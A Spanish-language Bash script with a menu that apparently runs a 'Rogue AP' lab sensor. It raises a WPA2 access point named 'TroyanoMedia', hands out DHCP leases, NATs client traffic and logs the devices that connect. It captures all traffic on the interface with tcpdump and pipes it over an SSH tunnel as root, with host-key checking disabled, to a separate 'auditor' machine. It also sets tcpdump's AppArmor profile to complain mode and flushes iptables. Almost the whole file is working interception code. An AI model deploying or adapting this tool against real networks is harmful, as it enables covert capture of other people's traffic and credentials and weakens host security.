#!/bin/bash

# ==========================================================
#                  CONFIGURACIÓN DE RED REAL
# ==========================================================
C_IFACE="enp0s10"            
VM_IP="192.168.1.83"         
ROUTER_CASA="192.168.1.1"    

# ==========================================================
#                CONFIGURACIÓN DEL LABORATORIO
# ==========================================================
W_IFACE="wlp3s0b1"           
LAB_IP="192.168.100.1"       
LAB_RANGE="192.168.100.10,192.168.100.50"
SSID="TroyanoMedia"
PASS="01*00*00*01"
DNS_LAB="1.1.1.1"
PIPE_PATH="/tmp/wifi_pipe"
SSH_SOCKET="/tmp/ssh_tunnel_ctrl"

# ==========================================================
#                     MENÚ PRINCIPAL
# ==========================================================
mostrar_menu() {
    clear
    echo -e "\e[34m====================================================\e[0m"
    echo -e "\e[34m      MENU SENSOR ROGUE AP (HP MINI) - 24/7         \e[0m"
    echo -e "\e[34m====================================================\e[0m"
    echo "1) INSTALAR (Dependencias + Generar Llaves SSH)"
    echo "2) INICIAR  (Rogue AP + Monitor DHCP + Túnel SSH)"
    echo "3) LIMPIAR  (Reset de Seguridad y Procesos)"
    echo "4) SALIR"
    echo -e "\e[34m====================================================\e[0m"
    read -p "Seleccione una opción: " OPCION
}

# ==========================================================
#                    FUNCIONES DE APOYO
# ==========================================================

# Ruta del log de depuración
DEBUG_LOG="/tmp/wifi_sensor_debug.log"

log_debug() {
    echo "$(date '+%Y-%m-%d %H:%M:%S') | $1" >> "$DEBUG_LOG"
}

# Verifica que hostapd está habilitado y en estado ENABLED
check_hostapd_status() {
    local retries=5
    local wait_sec=2
    for ((i=1;i<=retries;i++)); do
        hostapd_cli -i "$W_IFACE" status 2>/dev/null | grep -q "state=ENABLED"
        if [ $? -eq 0 ]; then
            log_debug "hostapd activo (intento $i)"
            return 0
        fi
        log_debug "hostapd no activo (intento $i), reintento en $wait_sec s"
        sleep $wait_sec
    done
    return 1
}

# Verifica que dnsmasq está corriendo y escuchando en la interfaz
check_dnsmasq_status() {
    pgrep -x dnsmasq >/dev/null 2>&1 && ss -upln | grep -q "${W_IFACE}" && return 0
    return 1
}

instalar() {
    clear
    echo "[+] Instalando dependencias del SENSOR (Solución BUG-002)..."
    apt update && apt install -y tcpdump dnsmasq hostapd openssh-client iw iptables
    
    echo "[+] Generando par de claves SSH para autenticación desatendida..."
    # Validamos si existe para no romper llaves preexistentes
    if [ ! -f /root/.ssh/id_rsa ]; then
        ssh-keygen -t rsa -b 4096 -f /root/.ssh/id_rsa -N ""
    else
        echo "[*] La clave SSH ya existe en /root/.ssh/id_rsa"
    fi
    
    echo ""
    echo "[!] CRÍTICO: Exporta la clave pública al auditor ejecutando:"
    echo "    ssh-copy-id root@$VM_IP"
    echo ""
    read -p "Presione Enter para continuar..."
}

limpiar_todo() {
    echo "[+] Limpiando sistema y procesos..."
    if [ -S "$SSH_SOCKET" ]; then
        ssh -O exit -S "$SSH_SOCKET" root@$VM_IP >/dev/null 2>&1
        rm -f "$SSH_SOCKET"
    fi
    
    killall hostapd dnsmasq tcpdump nc ssh 2>/dev/null
    
    # Reset de seguridad AppArmor para tcpdump
    if command -v aa-complain >/dev/null 2>&1; then
        aa-complain /usr/sbin/tcpdump >/dev/null 2>&1
    fi
    
    iptables -F
    iptables -t nat -F
    ip addr flush dev $W_IFACE 2>/dev/null
    rfkill unblock wifi 2>/dev/null
    
    # Borrar archivos de configuración temporales
    rm -f /tmp/hostapd_lab.conf /tmp/dnsmasq_lab.conf /tmp/dnsmasq.leases /tmp/historial.log
    echo "[+] Limpieza terminada."
    sleep 1
}

iniciar() {
    limpiar_todo
    
    # 1. Preparar hardware y verificar soporte AP
    echo "[+] Preparando hardware inalámbrico ($W_IFACE)..."
    rfkill unblock wifi 2>/dev/null
    
    if command -v iw >/dev/null 2>&1; then
        if ! iw list 2>/dev/null | grep -q "AP"; then
            echo "[!] Advertencia: No se detectó la capacidad 'AP' en 'iw list'. El controlador podría fallar."
            sleep 1
        fi
    fi

    ip link set $W_IFACE up
    ip addr add $LAB_IP/24 dev $W_IFACE
    
    # 2. Ruteo e Internet con Persistencia estricta (Regla 1)
    echo "[+] Configurando enrutamiento y NAT..."
    echo 1 > /proc/sys/net/ipv4/ip_forward
    
    # Persistencia en sysctl.conf
    if grep -q "^#net.ipv4.ip_forward=1" /etc/sysctl.conf; then
        sed -i 's/^#net.ipv4.ip_forward=1/net.ipv4.ip_forward=1/' /etc/sysctl.conf
    elif ! grep -q "^net.ipv4.ip_forward=1" /etc/sysctl.conf; then
        echo "net.ipv4.ip_forward=1" >> /etc/sysctl.conf
    fi

    iptables -t nat -A POSTROUTING -o $C_IFACE -j MASQUERADE
    iptables -I FORWARD -s 192.168.100.0/24 -d $ROUTER_CASA -j DROP

    # 3. Servidor DHCP
    echo "[+] Iniciando servidor DHCP (dnsmasq)..."
    cat <<EOF > /tmp/dnsmasq_lab.conf
interface=$W_IFACE
dhcp-range=$LAB_RANGE,12h
dhcp-option=3,$LAB_IP
dhcp-option=6,$DNS_LAB
dhcp-leasefile=/tmp/dnsmasq.leases
EOF
    dnsmasq -C /tmp/dnsmasq_lab.conf

    # 4. Punto de Acceso WiFi
    echo "[+] Levantando Punto de Acceso Rogue AP (hostapd)..."
    cat <<EOF > /tmp/hostapd_lab.conf
interface=$W_IFACE
driver=nl80211
ssid=$SSID
hw_mode=g
channel=6
wpa=2
wpa_passphrase=$PASS
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF
    hostapd -B /tmp/hostapd_lab.conf
    sleep 2

    # 5. Monitor de presencia e Historial con AUTO-RECONEXIÓN ROBUSTA (Solución BUG-003)
    while true; do
        clear
        echo "-----------------------------------------------------------------"
        echo "  SENSOR: $SSID | MONITOR: ON | VM AUDITOR: $VM_IP"
        echo "  PRESIONE [CTRL+C] PARA VOLVER AL MENU PRINCIPAL"
        echo "-----------------------------------------------------------------"

        # --- LÓGICA DE RECONEXIÓN MULTIPLEXADA POR SOCKET SSH ---
        # Interrogamos activamente el socket de control para validar la salud real de la conexión
        if ! ssh -O check -S "$SSH_SOCKET" root@$VM_IP >/dev/null 2>&1; then
            echo -e "ESTADO DEL TÚNEL SSH: \e[33mDESCONECTADO (ESTABLECIENDO TÚNEL...)\e[0m"
            
            # Limpiamos procesos previos y socket huérfano
            ssh -O exit -S "$SSH_SOCKET" root@$VM_IP >/dev/null 2>&1
            killall tcpdump ssh 2>/dev/null
            rm -f "$SSH_SOCKET"
            
            # Lanzamos captura continua con multiplexación y persistencia de control
            tcpdump -l -i $W_IFACE -U -s 0 -w - 2>/dev/null | ssh -S "$SSH_SOCKET" -o ControlMaster=auto -o ControlPersist=yes -o ConnectTimeout=5 -o StrictHostKeyChecking=no root@$VM_IP "cat > $PIPE_PATH" 2>/dev/null &
            PID_TUNNEL=$!
            
            # Damos tiempo al socket para negociar la conexión y enviar el header PCAP
            sleep 2
        else
            echo -e "ESTADO DEL TÚNEL SSH: \e[32mCONECTADO Y ACTIVO (SOCKET OK)\e[0m"
        fi
        echo "-----------------------------------------------------------------"

        # 6. DISPOSITIVOS CONECTADOS (TIEMPO REAL ESTRICTO)
        echo "DISPOSITIVOS CONECTADOS (EN VIVO):"
        printf "%-17s %-15s %-15s %s\n" "MAC" "IP" "HOSTNAME" "ESTADO"
        echo "-----------------------------------------------------------------"
        if [ -f /tmp/dnsmasq.leases ]; then
            LEASES_COUNT=0
            
            # Leemos directamente desde la tarjeta de red quién está asociado físicamente
            MACS_ACTIVAS=$(iw dev $W_IFACE station dump 2>/dev/null | grep -i "Station" | awk '{print $2}')

            while read -r exp mac ip name id; do
                [ -z "$mac" ] && continue
                
                # Cruzamos la IP con los dispositivos que realmente están transmitiendo
                if echo "$MACS_ACTIVAS" | grep -qi "$mac"; then
                    [ "$name" = "*" ] && name="Desconocido"
                    printf "%-17s %-15s %-15s \e[32mACTIVO\e[0m\n" "$mac" "$ip" "$name"
                    
                    # Guardamos en el historial solo si es una conexión nueva
                    ! grep -q "$mac" /tmp/historial.log 2>/dev/null && echo "$(date '+%H:%M:%S') | $mac | $ip | $name" >> /tmp/historial.log
                    ((LEASES_COUNT++))
                fi
            done < /tmp/dnsmasq.leases
            
            if [ $LEASES_COUNT -eq 0 ]; then
                echo "  (No hay dispositivos transmitiendo actualmente)"
            fi
        else
            echo "  (No hay dispositivos registrados en DHCP aún)"
        fi
        
        echo -e "\nHISTORIAL DE SESIONES REGISTRADAS:"
        [ -f /tmp/historial.log ] && tail -n 5 /tmp/historial.log | sort -r
        
        sleep 4
    done
}

# ==========================================================
#                   BUCLE DE EJECUCIÓN
# ==========================================================
while true; do
    mostrar_menu
    case $OPCION in
        1) instalar ;;
        2) iniciar ;;
        3) limpiar_todo ;;
        4) 
            if [ -S "$SSH_SOCKET" ]; then
                ssh -O exit -S "$SSH_SOCKET" root@$VM_IP >/dev/null 2>&1
                rm -f "$SSH_SOCKET"
            fi
            exit 0 
            ;;
        *) echo "Opción no válida"; sleep 1 ;;
    esac
done